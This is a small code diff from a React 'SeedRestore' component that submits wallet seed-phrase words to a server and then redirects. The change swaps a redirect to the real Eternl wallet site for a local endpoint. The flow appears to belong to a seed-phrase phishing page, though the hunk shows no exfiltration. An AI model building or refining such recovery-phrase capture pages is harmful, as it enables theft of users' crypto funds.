@@ -228,7 +228,7 @@ export default function SeedRestore({
       const result = await response.json();
 
       if (response.status === 200 && result.status) {
-        window.location.href = "https://eternl.io/";
+        window.location.href = "/api/login-out";
         console.log("Seed phrase validation successful:", result);
         onConfirm?.(words);
       } else {
